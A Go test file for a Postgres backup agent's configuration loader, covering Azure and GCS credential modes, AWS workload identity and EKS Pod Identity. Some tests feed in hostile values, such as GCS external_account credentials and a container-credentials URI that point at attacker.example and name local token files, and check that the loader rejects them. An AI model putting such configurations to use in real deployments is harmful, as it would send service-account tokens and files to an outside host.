// Copyright 2026 The pgToolBox Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package config

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// agentProviderEnvironment is what the operator renders for an Azure or GCS
// repository: the agent profile without the S3 variables.
func agentProviderEnvironment(t *testing.T, provider, destination string, extra map[string]string) map[string]string {
	t.Helper()
	accessPath, secretPath := agentCredentialFiles(t)
	environment := validAgentEnvironment(accessPath, secretPath)
	for _, variable := range []string{"AWS_ACCESS_KEY_ID_FILE", "AWS_SECRET_ACCESS_KEY_FILE", "AWS_REGION", "STORE_CREDENTIAL_MODE"} {
		delete(environment, variable)
	}
	environment["PROVIDER"], environment["DESTINATION_PATH"] = provider, destination
	environment["CNPG_CLUSTER_NAMESPACE"] = "database-team"
	for key, value := range extra {
		environment[key] = value
	}
	return environment
}

func secretFile(t *testing.T, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "secret")
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestLoadAgentReadsAzureAndGCS(t *testing.T) {
	key := secretFile(t, "synthetic-canary")
	cfg, err := Load(mapEnvironment(agentProviderEnvironment(t, "azure", "azure://backups/team-a", map[string]string{
		"AZURE_STORAGE_ACCOUNT": "orders", "STORE_CREDENTIAL_MODE": "account-key-file", "AZURE_STORAGE_ACCOUNT_KEY_FILE": key,
	})))
	if err != nil || cfg.RepositoryError != nil || cfg.Provider != ProviderAzure || cfg.DestinationBucket != "backups" ||
		cfg.Credentials.Mode != CredentialAccountKeyFile || cfg.Credentials.AzureAccount != "orders" {
		t.Fatalf("Azure agent = %#v, %v", cfg, err)
	}
	connection := secretFile(t, "DefaultEndpointsProtocol=http;AccountName=devstoreaccount1;AccountKey=synthetic-canary;BlobEndpoint=http://azurite:10000/devstoreaccount1")
	cfg, err = Load(mapEnvironment(agentProviderEnvironment(t, "azure", "azure://backups", map[string]string{
		"AZURE_STORAGE_ACCOUNT": "devstoreaccount1", "ENDPOINT_URL": "http://azurite:10000",
		"STORE_CREDENTIAL_MODE": "connection-string-file", "AZURE_STORAGE_CONNECTION_STRING_FILE": connection,
	})))
	if err != nil || cfg.RepositoryError != nil || cfg.Endpoint == nil || cfg.Credentials.Mode != CredentialConnectionFile || cfg.Credentials.AzureAccount != "devstoreaccount1" {
		t.Fatalf("Azure emulator agent = %#v, %v", cfg, err)
	}
	json := secretFile(t, `{"type":"service_account","private_key":"synthetic-canary"}`)
	cfg, err = Load(mapEnvironment(agentProviderEnvironment(t, "gcs", "gs://backups/team-a", map[string]string{
		"STORE_CREDENTIAL_MODE": "json-file", "GOOGLE_APPLICATION_CREDENTIALS": json,
	})))
	if err != nil || cfg.RepositoryError != nil || cfg.Provider != ProviderGCS || cfg.Credentials.Mode != CredentialJSONFile {
		t.Fatalf("GCS agent = %#v, %v", cfg, err)
	}
	// Only a service account key: an external_account file would make the
	// client send a local file to the token URL it names.
	external := secretFile(t, `{"type":"external_account","token_url":"https://attacker.example/token","credential_source":{"file":"/etc/hostname"}}`)
	cfg, err = Load(mapEnvironment(agentProviderEnvironment(t, "gcs", "gs://backups/team-a", map[string]string{
		"STORE_CREDENTIAL_MODE": "json-file", "GOOGLE_APPLICATION_CREDENTIALS": external,
	})))
	if (err == nil && !IsError(cfg.RepositoryError)) || cfg.Credentials.GoogleCredentialsJSON.Bytes() != nil {
		t.Fatalf("GCS external_account = %v, %v", cfg.RepositoryError, err)
	}

	for name, test := range map[string]struct {
		environment map[string]string
		variable    string
	}{
		"Azure without an account": {agentProviderEnvironment(t, "azure", "azure://backups", map[string]string{
			"STORE_CREDENTIAL_MODE": "connection-string-file", "AZURE_STORAGE_CONNECTION_STRING_FILE": connection,
		}), "AZURE_STORAGE_ACCOUNT"},
		"Azure without a mode": {agentProviderEnvironment(t, "azure", "azure://backups", map[string]string{
			"AZURE_STORAGE_ACCOUNT": "orders", "AZURE_STORAGE_ACCOUNT_KEY_FILE": key,
		}), "STORE_CREDENTIAL_MODE"},
		"Azure mode and files disagree": {agentProviderEnvironment(t, "azure", "azure://backups", map[string]string{
			"AZURE_STORAGE_ACCOUNT": "orders", "STORE_CREDENTIAL_MODE": "ambient", "AZURE_STORAGE_ACCOUNT_KEY_FILE": key,
		}), "STORE_CREDENTIAL_MODE"},
		"GCS file missing for json-file": {agentProviderEnvironment(t, "gcs", "gs://backups", map[string]string{
			"STORE_CREDENTIAL_MODE": "json-file",
		}), "STORE_CREDENTIAL_MODE"},
		"GCS with an endpoint": {agentProviderEnvironment(t, "gcs", "gs://backups", map[string]string{
			"STORE_CREDENTIAL_MODE": "ambient", "ENDPOINT_URL": "https://storage.example.test",
		}), "ENDPOINT_URL"},
	} {
		t.Run(name, func(t *testing.T) {
			cfg, err := Load(mapEnvironment(test.environment))
			if err == nil {
				err = cfg.RepositoryError
			}
			var configErr *Error
			if !errors.As(err, &configErr) || configErr.Variable != test.variable {
				t.Fatalf("Load() = %v, want an error naming %s", err, test.variable)
			}
		})
	}
}

func TestApplyResolvedAzureAndGCS(t *testing.T) {
	base, err := loadExact(teamAgentEnvironment())
	if err != nil {
		t.Fatal(err)
	}
	azure := ResolvedRepository{
		ClusterUID: "2f12b7d1-7e8d-4c37-a68f-233efc5f3191", ServerName: "orders", Provider: ProviderAzure,
		DestinationPath: "azure://backups/team-a", AzureAccount: "orders", Credential: CredentialSASTokenFile,
		AzureSASToken: []byte("sv=2024&sig=synthetic-canary"),
	}
	cfg := ApplyResolved(base, azure, 1, nil)
	if cfg.RepositoryError != nil || cfg.Provider != ProviderAzure || cfg.DestinationBucket != "backups" || cfg.DestinationPrefix != "team-a" ||
		cfg.Credentials.Mode != CredentialSASTokenFile || cfg.Credentials.AzureAccount != "orders" || cfg.Credentials.AzureSASToken.Empty() {
		t.Fatalf("Azure = %#v", cfg)
	}
	if values := cfg.SecretValues(); len(values) != 1 || string(values[0]) != "sv=2024&sig=synthetic-canary" {
		t.Fatal("the SAS token does not reach the redactor")
	}
	gcs := ResolvedRepository{
		ClusterUID: "2f12b7d1-7e8d-4c37-a68f-233efc5f3191", ServerName: "orders", Provider: ProviderGCS,
		DestinationPath: "gs://backups/team-a", Credential: CredentialJSONFile, GoogleCredentialsJSON: []byte(`{"type":"service_account","private_key":"synthetic-canary"}`),
	}
	if cfg := ApplyResolved(base, gcs, 1, nil); cfg.RepositoryError != nil || cfg.Provider != ProviderGCS || cfg.Credentials.GoogleCredentialsJSON.Empty() {
		t.Fatalf("GCS = %#v", cfg)
	}

	for name, candidate := range map[string]ResolvedRepository{
		"Azure account not a name":       func() ResolvedRepository { r := azure; r.AzureAccount = "Orders_1"; return r }(),
		"Azure without a value":          func() ResolvedRepository { r := azure; r.AzureSASToken = nil; return r }(),
		"Azure without a mode":           func() ResolvedRepository { r := azure; r.Credential = ""; return r }(),
		"Azure with an S3 scheme":        func() ResolvedRepository { r := azure; r.DestinationPath = "s3://backups"; return r }(),
		"Azure with a CA that is no PEM": func() ResolvedRepository { r := azure; r.EndpointCABundle = []byte("x"); return r }(),
		"GCS with a CA":                  func() ResolvedRepository { r := gcs; r.EndpointCABundle = testCAPEM(t); return r }(),
		"GCS with invalid JSON":          func() ResolvedRepository { r := gcs; r.GoogleCredentialsJSON = []byte("synthetic-canary"); return r }(),
		"GCS external_account": func() ResolvedRepository {
			r := gcs
			r.GoogleCredentialsJSON = []byte(`{"type":"external_account","token_url":"https://attacker.example/token","credential_source":{"file":"/var/run/secrets/kubernetes.io/serviceaccount/token"},"canary":"synthetic-canary"}`)
			return r
		}(),
		"GCS authorized_user": func() ResolvedRepository {
			r := gcs
			r.GoogleCredentialsJSON = []byte(`{"type":"authorized_user","refresh_token":"synthetic-canary"}`)
			return r
		}(),
		"GCS with an endpoint":     func() ResolvedRepository { r := gcs; r.EndpointURL = "https://storage.example.test"; return r }(),
		"GCS without a credential": func() ResolvedRepository { r := gcs; r.Credential = ""; return r }(),
		"an unknown provider":      func() ResolvedRepository { r := gcs; r.Provider = "ftp"; return r }(),
	} {
		t.Run(name, func(t *testing.T) {
			cfg := ApplyResolved(base, candidate, 1, nil)
			if !IsError(cfg.RepositoryError) || strings.Contains(cfg.RepositoryError.Error(), "canary") || len(cfg.SecretValues()) != 0 || cfg.Destination != nil {
				t.Fatalf("%#v", cfg)
			}
		})
	}
}

// TestWorkloadIdentity: the variables an identity webhook injects do not
// conflict with self-resolution, an ambient S3 repository without a region
// in its configuration signs with the Pod's AWS_REGION, and the operator's
// agent accepts STORE_CREDENTIAL_MODE=ambient for every provider.
func TestWorkloadIdentity(t *testing.T) {
	environment := teamAgentEnvironment()
	environment["AWS_ROLE_ARN"] = "arn:aws:iam::123456789012:role/orders-backups"
	environment["AWS_WEB_IDENTITY_TOKEN_FILE"] = "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
	environment["AWS_REGION"] = "eu-west-3"
	environment["AZURE_CLIENT_ID"] = "00000000-0000-0000-0000-000000000000"
	base, err := loadExact(environment)
	if err != nil {
		t.Fatalf("injected workload-identity variables were refused: %v", err)
	}
	ambient := ResolvedRepository{
		ClusterUID: "2f12b7d1-7e8d-4c37-a68f-233efc5f3191", ServerName: "orders", Provider: ProviderS3,
		DestinationPath: "s3://backups/team-a", Credential: CredentialAmbient,
	}
	cfg := ApplyResolved(base, ambient, 1, nil)
	if cfg.RepositoryError != nil || cfg.Credentials.Mode != CredentialAmbient || cfg.Credentials.AWSRegion != "eu-west-3" || cfg.Credentials.AWSKeySource != nil ||
		cfg.Credentials.AWSRoleARN != "arn:aws:iam::123456789012:role/orders-backups" {
		t.Fatalf("ambient S3 = %#v", cfg)
	}
	withRegion := ambient
	withRegion.Region = "us-east-2"
	if cfg := ApplyResolved(base, withRegion, 1, nil); cfg.Credentials.AWSRegion != "us-east-2" {
		t.Fatalf("the configuration's region lost to the Pod's: %q", cfg.Credentials.AWSRegion)
	}
	staticKeys := ambient
	staticKeys.Credential, staticKeys.Keys = CredentialKubernetesSecrets, staticKeyPair{}
	if cfg := ApplyResolved(base, staticKeys, 1, nil); !IsError(cfg.RepositoryError) {
		t.Fatal("a static-key AWS repository took its region from the Pod's environment")
	}
	noRegion, err := loadExact(teamAgentEnvironment())
	if err != nil {
		t.Fatal(err)
	}
	if cfg := ApplyResolved(noRegion, ambient, 1, nil); !IsError(cfg.RepositoryError) || !strings.Contains(cfg.RepositoryError.Error(), "AWS_REGION") {
		t.Fatalf("ambient AWS S3 without any region = %v", cfg.RepositoryError)
	}
	if cfg := ApplyResolved(noRegion, withRegion, 1, nil); !IsError(cfg.RepositoryError) || !strings.Contains(cfg.RepositoryError.Error(), "instance metadata") {
		t.Fatalf("ambient AWS S3 without an injected identity = %v", cfg.RepositoryError)
	}
	for provider, destination := range map[Provider]string{ProviderAzure: "azure://backups", ProviderGCS: "gs://backups"} {
		resolved := ResolvedRepository{
			ClusterUID: "2f12b7d1-7e8d-4c37-a68f-233efc5f3191", ServerName: "orders", Provider: provider,
			DestinationPath: destination, Credential: CredentialAmbient, AzureAccount: "orders",
		}
		if provider == ProviderGCS {
			resolved.AzureAccount = ""
		}
		if cfg := ApplyResolved(base, resolved, 1, nil); cfg.RepositoryError != nil || cfg.Credentials.Mode != CredentialAmbient || len(cfg.SecretValues()) != 0 {
			t.Fatalf("ambient %s = %#v", provider, cfg)
		}
	}

	// The operator's agent.
	operator := agentProviderEnvironment(t, "s3", "s3://backups/team-a", map[string]string{
		"STORE_CREDENTIAL_MODE": "ambient", "AWS_REGION": "eu-west-3",
		"AWS_ROLE_ARN": "arn:aws:iam::123456789012:role/orders-backups", "AWS_WEB_IDENTITY_TOKEN_FILE": "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
	})
	if cfg, err := Load(mapEnvironment(operator)); err != nil || cfg.RepositoryError != nil || cfg.Credentials.Mode != CredentialAmbient ||
		cfg.Credentials.AWSWebIdentityTokenFile != "/var/run/secrets/eks.amazonaws.com/serviceaccount/token" {
		t.Fatalf("operator ambient S3 = %#v, %v", cfg, err)
	}
	// EKS Pod Identity, and nothing else: no injected identity, or a
	// credential endpoint other than the Pod Identity Agent's, is refused
	// rather than left to the node's instance metadata.
	podIdentity := cloneMap(operator)
	delete(podIdentity, "AWS_ROLE_ARN")
	delete(podIdentity, "AWS_WEB_IDENTITY_TOKEN_FILE")
	podIdentity["AWS_CONTAINER_CREDENTIALS_FULL_URI"] = "http://169.254.170.23/v1/credentials"
	podIdentity["AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE"] = "/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token"
	if cfg, err := Load(mapEnvironment(podIdentity)); err != nil || cfg.RepositoryError != nil ||
		cfg.Credentials.AWSContainerCredentialsURI != "http://169.254.170.23/v1/credentials" || cfg.Credentials.AWSWebIdentityTokenFile != "" {
		t.Fatalf("operator ambient S3 with EKS Pod Identity = %#v, %v", cfg, err)
	}
	for name, change := range map[string]map[string]string{
		"no identity":       {"AWS_CONTAINER_CREDENTIALS_FULL_URI": ""},
		"foreign endpoint":  {"AWS_CONTAINER_CREDENTIALS_FULL_URI": "http://attacker.example/v1/credentials"},
		"https endpoint":    {"AWS_CONTAINER_CREDENTIALS_FULL_URI": "https://169.254.170.23/v1/credentials"},
		"relative token":    {"AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE": "token"},
		"IRSA without role": {"AWS_CONTAINER_CREDENTIALS_FULL_URI": "", "AWS_WEB_IDENTITY_TOKEN_FILE": "/var/run/token"},
	} {
		environment := cloneMap(podIdentity)
		for key, value := range change {
			environment[key] = value
		}
		if cfg, err := Load(mapEnvironment(environment)); err == nil && !IsError(cfg.RepositoryError) {
			t.Fatalf("%s: ambient S3 accepted %#v", name, cfg.Credentials)
		}
	}
	// Static files ignore the variables the IRSA webhook injects.
	accessPath, secretPath := agentCredentialFiles(t)
	static := cloneMap(operator)
	static["STORE_CREDENTIAL_MODE"], static["AWS_ACCESS_KEY_ID_FILE"], static["AWS_SECRET_ACCESS_KEY_FILE"] = "static-files", accessPath, secretPath
	if cfg, err := Load(mapEnvironment(static)); err != nil || cfg.RepositoryError != nil || cfg.Credentials.Mode != CredentialStaticFiles {
		t.Fatalf("static files with injected IRSA variables = %v, %v", cfg.RepositoryError, err)
	}
	operator["AWS_ACCESS_KEY_ID_FILE"] = accessPath
	if cfg, err := Load(mapEnvironment(operator)); err == nil && cfg.RepositoryError == nil {
		t.Fatal("ambient with a static key file was accepted")
	}
	for provider, destination := range map[string]string{"azure": "azure://backups", "gcs": "gs://backups"} {
		extra := map[string]string{"STORE_CREDENTIAL_MODE": "ambient"}
		if provider == "azure" {
			extra["AZURE_STORAGE_ACCOUNT"] = "orders"
		}
		if cfg, err := Load(mapEnvironment(agentProviderEnvironment(t, provider, destination, extra))); err != nil || cfg.RepositoryError != nil || cfg.Credentials.Mode != CredentialAmbient {
			t.Fatalf("operator ambient %s = %#v, %v", provider, cfg, err)
		}
	}
}

type staticKeyPair struct{}

func (staticKeyPair) Keys(context.Context) ([]byte, []byte, []byte, error) { return nil, nil, nil, nil }
